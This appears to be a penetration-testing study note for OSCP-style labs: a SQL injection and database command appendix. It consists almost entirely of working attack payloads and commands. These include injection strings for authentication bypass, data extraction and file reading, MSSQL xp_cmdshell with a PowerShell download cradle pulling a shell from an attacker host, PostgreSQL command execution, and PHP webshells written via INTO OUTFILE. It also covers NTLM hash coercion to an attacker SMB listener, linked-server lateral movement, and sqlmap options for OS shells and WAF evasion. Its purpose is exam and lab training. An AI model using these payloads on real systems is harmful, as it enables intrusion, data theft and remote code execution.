# SQL Injection & Databases, Command Appendix

Part of [[COMMAND APPENDIX]]. Direct DB client connections plus the full SQL injection payload set, manual and automated.

---

## MySQL

```bash
# Connect
mysql -u root -p'root' -h $BoxIP -P 3306 --skip-ssl-verify-server-cert
# If TLS errors: --skip-ssl instead

# Once connected
select version();
select system_user();
show databases;
use <database>;
show tables;
SELECT user, plugin, authentication_string FROM mysql.user WHERE user = '$Username';
```
See [[10. SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]].

#### Tags: #MySQL

---

## MSSQL (Impacket)

```bash
# Connect (NTLM auth, not Kerberos)
impacket-mssqlclient $Username:$Password@$BoxIP -windows-auth
```
```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <db>.information_schema.tables;
select * from <db>.dbo.<table>;
SELECT * FROM master.sys.sysusers;

-- Enable xp_cmdshell (disabled by default)
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell '<command>';
```
*Note: `impacket-mssqlclient`'s TDS connection doesn't need a trailing `GO` the way `sqlcmd` does. `dbo` schema name is required between database and table names, MySQL doesn't need this.*

**Injecting into an ASP.NET WebForms form** (`.aspx` pages): the `__VIEWSTATE`/`__VIEWSTATEGENERATOR`/`__EVENTVALIDATION` hidden fields have to ride along with every POST, scrape them fresh from the page each time:
```bash
curl -s http://$BoxIP/login.aspx -c /tmp/cookies.txt -o /tmp/login_page.html
VS=$(grep -oP '(?<=__VIEWSTATE" id="__VIEWSTATE" value=")[^"]*' /tmp/login_page.html)
VSG=$(grep -oP '(?<=__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value=")[^"]*' /tmp/login_page.html)
EV=$(grep -oP "(?<=__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\")[^\"]*" /tmp/login_page.html)

curl -s -b /tmp/cookies.txt -X POST http://$BoxIP/login.aspx \
  --data-urlencode "__VIEWSTATE=$VS" --data-urlencode "__VIEWSTATEGENERATOR=$VSG" --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$UsernameTextBox=<payload>" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$LoginButton=Login" -o /tmp/result.html
```
*Field names follow WebForms' `ctl00$ContentPlaceHolder1$<ControlID>` naming convention, get the exact names from the rendered page's `name="..."` attributes, they won't match the visible label text.*

**Blind RCE** (when the app doesn't surface stacked-query errors/results, see [[SQL Injection (Breakdowns)#Why stacked-query errors silently vanish while the query still executes|Command Breakdowns]]): confirm via `WAITFOR DELAY`, then fire a reverse shell blind and confirm via a caught listener instead of reading a return value:
```sql
'; WAITFOR DELAY '0:0:5'--                                          -- confirm stacked queries execute (time the request)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$BoxIP/shell.ps1'')"'--
```
*Full quoting breakdown (T-SQL → cmd.exe → PowerShell, three nested layers): [[SQL Injection (Breakdowns)#Triple-nested quoting for xp_cmdshell → cmd.exe → PowerShell download cradle|Command Breakdowns]].*

See [[10. SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]], [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]], [[10. SQL Injection Attacks#Capstone: Exercise VM #4|Capstone Labs, VM #4]] (ASP.NET WebForms + blind stacked-query RCE end to end).

#### Tags: #MSSQL #ImpacketMSSQLClient #XpCmdshell #ASPNETWebForms #StackedQueries

---

## MSSQL — sqlcmd (Linux client)

```bash
# Connect (SQL auth — prompts for password)
sqlcmd -S TARGET_IP -U username

# Connect using current Windows session (run inside RDP — no password prompt)
sqlcmd -S WIN-HARD
```

Every statement needs `go` on its own line to execute:
```sql
1> SELECT name FROM sys.databases
2> go

1> use flagDB
2> go

1> SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
2> go

1> SELECT * FROM tb_flag
2> go
```

🔁 [[06. Information Gathering|CS.3]], [[06. Information Gathering|CS.4]]

#### Tags: #MSSQL #sqlcmd #LinuxClient #WindowsAuth

---

## MSSQL — UNC Path Hash Coercion (xp_dirtree)

```bash
# Kali: set up SMB capture listener
sudo impacket-smbserver -smb2support share ./

# In MSSQL session (sqlcmd or impacket-mssqlclient): trigger outbound NTLM auth
EXEC master..xp_dirtree '\\KALI_IP\share'
go
# impacket-smbserver terminal captures: User::DOMAIN:challenge:response:blob

# Save and crack with hashcat mode 5600 (Net-NTLMv2)
echo "MSSQLSVC::..." > hash.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

🔁 [[06. Information Gathering|CS.2]], [[16. Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]]

#### Tags: #MSSQL #xpDirtree #UNCInjection #NetNTLMv2 #HashCoercion

---

## MSSQL — Impersonation (EXECUTE AS LOGIN)

```sql
-- Find who you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
go

-- Impersonate and verify sysadmin (1 = yes)
EXECUTE AS LOGIN = 'john'
go
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')
go

-- Revert when done
REVERT
go
```

🔁 [[06. Information Gathering|CS.5]]

#### Tags: #MSSQL #Impersonation #ExecuteAsLogin #PrivEsc

---

## MSSQL — Linked Server Attacks

```sql
-- Enumerate linked servers (isremote 0 = linked, 1 = remote)
SELECT srvname, isremote FROM sysservers
go

-- Test execution on linked server (combine with EXECUTE AS LOGIN if needed)
EXECUTE('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED.SERVER.NAME]
go

-- Enable xp_cmdshell on linked server (sp_configure via EXECUTE AT)
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE; EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED.SERVER.NAME]
go

-- Run OS commands on linked server
EXECUTE('xp_cmdshell ''more C:\users\administrator\desktop\flag.txt''') AT [LINKED.SERVER.NAME]
go
```

Nested quote escaping: `''` inside an EXECUTE string = one escaped single quote. Two levels of nesting need two levels of `''`.

🔁 [[06. Information Gathering|CS.6]]

#### Tags: #MSSQL #LinkedServer #sysservers #ExecuteAt #xpCmdshell #LateralMovement

---

## PostgreSQL

```bash
# Connect directly (port 5432 by default)
psql -h $BoxIP -U $Username -d <database>
```
```sql
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public';
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='<table>';

-- Check for superuser (needed before RCE below)
SELECT usename, usesuper FROM pg_user;

-- Error-based extraction via type-mismatch (leaks the value in the error text, no truncation cap)
SELECT CAST((SELECT version()) AS int);

-- RCE (superuser only, needs stacked queries e.g. via PHP's pg_query())
CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '<command>';
SELECT string_agg(cmd_output, ' | ') FROM cmd_exec;
```
*Postgres superuser + `COPY ... FROM PROGRAM` is the direct equivalent of MSSQL's `sysadmin` + `xp_cmdshell`, same idea (a privileged DB role reaching the OS), different DBMS-specific mechanism. `COPY FROM PROGRAM` has no return channel, its output has to be read back out through a separate query afterward.*

**Full injected one-liners (POST field going into a `LIKE '%<value>%'` clause):**
```bash
# Confirm injection + find column count
curl -s -X POST --data "field=x'" http://$BoxIP/page.php
curl -s -X POST --data "field=x%' ORDER BY <N>-- " http://$BoxIP/page.php | grep -iE "error|warning"

# Error-based extraction via CAST() (swap <N> for a column position confirmed integer-typed)
curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((<subquery>) AS int),NULL-- " http://$BoxIP/page.php | grep -iE "error|warning"

# RCE: setup (stacked queries), then read back the output
curl -s -X POST --data "field=x'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '<command>'; -- " http://$BoxIP/page.php
curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output,' | ')) AS int),NULL FROM cmd_exec-- " http://$BoxIP/page.php | grep -iE "error|warning"
```
*Base64-encode any reverse shell before dropping it into `COPY FROM PROGRAM`, and send it via `--data-urlencode` (not plain `--data`), base64 output routinely contains `+`, which `curl --data` sends raw and gets silently reinterpreted as a space by the receiving server.*

See [[10. SQL Injection Attacks#Capstone: Exercise VM #3|Capstone Labs, VM #3]] for the full worked walkthrough, and [[SQL Injection (Breakdowns)#PostgreSQL error-based extraction via CAST() type-mismatch|Command Breakdowns]] for why each piece works.

#### Tags: #PostgreSQL #ErrorBasedSQLi #StackedQueries #RCE

---

## SQL Injection Payloads

```
-- Auth bypass (username field)
offsec' OR 1=1 -- //

-- Error-based enumeration
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

-- UNION-based: find column count, then enumerate
' ORDER BY 1-- //
' UNION SELECT null, null, database(), user(), @@version -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

-- Blind (boolean / time-based)
$BoxIP?user=offsec' AND 1=1 -- //
$BoxIP?user=offsec' AND IF (1=1, sleep(3),'false') -- //

-- MySQL webshell write via UNION + INTO OUTFILE
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

-- Shorter webshell variant (fewer URL-encoding issues, uses PHP backtick exec shorthand)
-- <?= is short echo tag, `$_GET[0]` runs param "0" as a shell command and echoes output
-- Usage: /shell.php?0=id
' UNION SELECT "","<?=`\$_GET[0]`?>","","" INTO OUTFILE "/var/www/html/shell.php" -- //

-- Finding the web root to target with INTO OUTFILE (read web server config via LOAD_FILE):
-- Nginx:  LOAD_FILE("/etc/nginx/sites-enabled/default")  → look for "root $BoxDir;"
-- Apache: LOAD_FILE("/etc/apache2/sites-enabled/000-default.conf")  → look for "DocumentRoot $BoxDir"
-- Also try: LOAD_FILE("/var/www/html/index.php") or LOAD_FILE("/var/www/html/config.php")
--           to find PHP includes and config files (DB creds often live in config.php)

-- FILE privilege and write access checks (in-band UNION variant, when results render on page)
-- Step 1: super admin check
' UNION SELECT 1,super_priv,3,4 FROM mysql.user-- -
-- "Y" = YES, has super privileges

-- Step 2: list all privileges for current user
' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -
-- Look for FILE in the privilege_type column

-- Step 3: check secure_file_priv (empty = can read/write anywhere; NULL = can't read/write)
' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -

-- Step 4: read a file (source code, config, /etc/passwd)
' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -

-- Error-based extraction via extractvalue() (MySQL), works even on injection points where
-- nothing is reflected (e.g. an INSERT statement), as long as DB errors reach the response
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -

-- File read without OUTFILE/code-exec, useful when the injection point is INSERT-only
-- (no SELECT context to attach INTO OUTFILE to) but FILE privilege + secure_file_priv='' allow it
' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),1,31)))-- -
```
*`extractvalue()`/`updatexml()` both truncate their output to 32 characters (including the `~` marker), so long values need paging through with `substring(value, start, 31)`, incrementing `start` by 31 each time.*

> **Gotcha:** `INTO OUTFILE` throws `File already exists` if a file is already sitting at that exact path, MySQL will never overwrite one. Just change the filename (e.g. `shell2.php`) and re-run. See [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]] for a worked example.

**Full `curl` one-liners for a POST-based error-based extraction** (no sqlmap, manual only, one field goes straight into an `INSERT`):
```bash
# Confirm the injection (single quote breaks the query, error text comes back in the response)
curl -X POST --data "mail-list=test'" http://$BoxIP/index.php

# Version, current DB, tables, columns, in that order
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -" http://$BoxIP/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -" http://$BoxIP/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -" http://$BoxIP/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<table>')))-- -" http://$BoxIP/index.php | grep -i "XPATH"

# Dump one row at a time with LIMIT (keeps each extractvalue() result short enough to read whole)
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT concat(<col1>,0x7c,<col2>) FROM <table> LIMIT 0,1)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
for i in 1 2 3 4 5; do
  curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT concat(<col1>,0x7c,<col2>) FROM <table> LIMIT $i,1)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
done

# Privilege/config checks before trying a file read
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT current_user())))-- -" http://$BoxIP/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%$Username%')))-- -" http://$BoxIP/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT @@secure_file_priv)))-- -" http://$BoxIP/index.php | grep -i "XPATH"

# Read a file, paged 31 characters at a time (increment the start offset by 31 each call)
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),1,31)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),32,31)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
```
*Swap `mail-list`/`index.php` for whatever field/page the target form actually uses (check the `<form method="...">` and `name="..."` attributes first, same lookup as [[10. SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2's Step 0]]). The `grep -i "XPATH"` just filters the huge HTML response down to the one line containing the leaked error.*

See [[10. SQL Injection Attacks#10.2. Manual SQL Exploitation|10.2]], [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|10.3.1]], [[10. SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (VM #2, `extractvalue` + `LOAD_FILE` end to end, no sqlmap).

> 🔍 Don't just copy these, understand why each fragment is there: [[SQL Injection (Breakdowns)|full command breakdowns]] for the `extractvalue()` one-liners above.

#### Tags: #SQLInjection #UnionSQLi #BlindSQLi #ErrorBasedSQLi

---

## Sqlmap

```bash
# Discovery/fingerprint
sqlmap -u "http://$BoxIP/page.php?id=1" -p id

# POST-based form instead of a GET parameter (check the page's <form method="..."> first)
sqlmap -u "http://$BoxIP/page.php" --data="field=test" -p field --batch

# Dump the current database
sqlmap -u "http://$BoxIP/page.php?id=1" -p id --dump

# Force one specific technique, then dump one specific table
sqlmap -u "http://$BoxIP/page.php?id=1" -p id --technique=T -T users --dump

# Full interactive OS shell (capture a POST request via Burp first, save as post.txt)
sqlmap -r post.txt -p <param> --os-shell --web-root "/var/www/html/tmp"

# Target keeps answering with a non-2xx status even on valid requests (e.g. a WP AJAX
# handler that always replies 404), sqlmap otherwise bails out treating it as unreachable
sqlmap -u "http://$BoxIP/wp-admin/admin-ajax.php?action=<name>&id=1" -p id --batch --ignore-code=404
```
*`--technique=` letters: `B`=boolean-blind, `E`=error-based, `U`=union, `S`=stacked queries, `T`=time-blind, `Q`=inline queries. Useful when sqlmap finds several techniques but the one you actually want (or the fastest one) isn't the default it picks.*

*Bonus: if a dumped column looks like password hashes, sqlmap offers to crack them on the spot with its bundled wordlist, no separate hashcat/john step needed for weak/common passwords.*

See [[10. SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2]] and [[10. SQL Injection Attacks#🏆 Capstone Labs|the Capstone Labs section]] for the WordPress AJAX example.

### Sqlmap — Advanced Injection Points

```bash
# * injection marker: explicitly marks the injection point when sqlmap can't auto-detect it
# Use in URLs, cookie headers, custom headers — anywhere the param isn't a standard GET/POST field

# Cookie header injection
sqlmap -u 'http://$BoxIP/page.php' -H 'Cookie: id=*' --batch --dump

# URL injection at a specific position (not the last param)
sqlmap -u 'http://$BoxIP/page.php?id=*&other=value' --batch --dump

# Custom header injection (e.g. X-Forwarded-For)
sqlmap -u 'http://$BoxIP/page.php' -H 'X-Forwarded-For: *' --batch

# JSON body injection — save full HTTP request to a file (Burp: right-click → Save item)
# sqlmap auto-detects JSON content type and tests the values inside
sqlmap -r request.req --batch --dump
```

### Sqlmap — Attack Tuning

```bash
# --level and --risk: push harder when default detection misses the injection
# Default: --level 1 --risk 1
# Max:     --level 5 --risk 3 (--risk 3 adds OR-based payloads that can modify data — avoid on production)
sqlmap -u 'http://$BoxIP/page.php?id=*' --level 5 --risk 3 --batch --dump

# --prefix: close a non-standard bracket/function wrapping before the injection payload
# Use when a single quote causes an error but standard payloads still fail
# (inspect the error message to figure out what structure precedes your input)
sqlmap -u 'http://$BoxIP/page.php?col=id' --prefix='`)' --batch --dump

# --union-cols: tell sqlmap the exact column count when auto-detection gets it wrong
sqlmap -u 'http://$BoxIP/page.php?id=1' --technique=U --union-cols=5 --batch --dump
# --union-char=a          use 'a' instead of NULL for filler columns
# --union-from=<table>    use a different FROM clause (if FROM DUAL causes errors)
```

### Sqlmap — WAF and Protection Bypass

```bash
# --random-agent: rotate User-Agent string per request (pulls from real-browser UA database)
# Cheap, should be default for any WAF-protected target
sqlmap -u 'http://$BoxIP/page.php?id=1' --random-agent --batch --dump

# --csrf-token: auto-refresh an anti-CSRF token before each request
# Include the current token value in --data; sqlmap re-fetches and substitutes it automatically
sqlmap -u 'http://$BoxIP/form.php' \
       --data 'id=1&csrf_token=<current_token_value>' \
       --csrf-token=csrf_token \
       --batch --dump

# --randomize: generate a fresh random value for a specific parameter each request
# Use when the app rejects repeated values (e.g. a transaction UID that must be unique per call)
sqlmap -u 'http://$BoxIP/page.php?id=1&uid=<current_value>' --randomize=uid --batch --dump

# --tamper: post-process payloads through a Python script to bypass keyword/character filters
sqlmap -u 'http://$BoxIP/page.php?id=1' --tamper=between --batch --dump

# Chaining tamper scripts
sqlmap -u 'http://$BoxIP/page.php?id=1' --tamper=between,space2comment,randomcase --batch --dump

# List all available tamper scripts
ls /usr/share/sqlmap/tamper/
```

**Useful tamper scripts:**
| Script | What it transforms |
|--------|-------------------|
| `between` | Replaces `>` with `BETWEEN x AND y+1`, handles `=` same way |
| `space2comment` | Replaces spaces with `/**/` |
| `randomcase` | Randomizes keyword case (`SELECT` → `sElEcT`) |
| `charencode` | URL-encodes non-standard characters |
| `apostrophemask` | Replaces `'` with its unicode full-width equivalent |
| `base64encode` | Base64-encodes the payload (only works if app decodes it server-side) |

### Sqlmap — Enumeration

```bash
# Target a specific database and table (critical for time-based blind — don't dump everything)
sqlmap -u 'http://$BoxIP/page.php?id=1' -D <dbname> -T <tablename> --batch --dump

# Enumerate databases, then tables, then columns before dumping
sqlmap -u 'http://$BoxIP/page.php?id=1' --dbs --batch
sqlmap -u 'http://$BoxIP/page.php?id=1' -D <dbname> --tables --batch
sqlmap -u 'http://$BoxIP/page.php?id=1' -D <dbname> -T <tablename> --columns --batch

# Search for columns/tables/databases by keyword (searches across all accessible databases)
sqlmap -u 'http://$BoxIP/page.php?id=1' --search -C <keyword>   # search column names
sqlmap -u 'http://$BoxIP/page.php?id=1' --search -T <keyword>   # search table names
sqlmap -u 'http://$BoxIP/page.php?id=1' --search -D <keyword>   # search database names
```

**sqlmap output directory**, all dumps and file reads are saved to:
```
~/.local/share/sqlmap/output/$BoxIP/dump/<dbname>/<tablename>.csv
~/.local/share/sqlmap/output/$BoxIP/files/_var_www_html_flag.txt  (/ replaced with _)
```
Check this directory when dump content doesn't appear in the terminal. Use `ls ~/.local/share/sqlmap/output/` to see what's been captured.

### Sqlmap — OS Exploitation

```bash
# Read an arbitrary file (requires FILE privilege and secure_file_priv='' or matching path)
sqlmap -u "http://$BoxIP/page.php?id=1" --file-read "/var/www/html/flag.txt" --batch
# Output saved to: ~/.local/share/sqlmap/output/<host>/files/_var_www_html_flag.txt

# OS shell — error-based is faster than time-blind for the file-write upload
# --technique=E avoids waiting for SLEEP() delays during the stager write
sqlmap -u 'http://$BoxIP/page.php?id=1' --os-shell --technique=E --batch
# If it can't find a writable web root automatically:
sqlmap -u 'http://$BoxIP/page.php?id=1' --os-shell --technique=E --web-root "/var/www/html" --batch
```

#### Tags: #Sqlmap #CookieInjection #JSONInjection #WAFBypass #CSRFToken #Tamper #RandomAgent #FileRead #OSShell #AdvancedSqlmap

---

## **Outstanding**
This area grows alongside the modules. Whenever a new DB engine or SQLi variant comes up (PostgreSQL, NoSQL injection, second-order SQLi, etc), add it here with a link back to the source section.
## External Resources

- [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell payload selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
## Why this matters for OSCP

This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.

## Related Modules

- [[MODULES/10. SQL Injection Attacks]] -- module concepts used by this hub page

## Demonstrated in box write-ups

- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
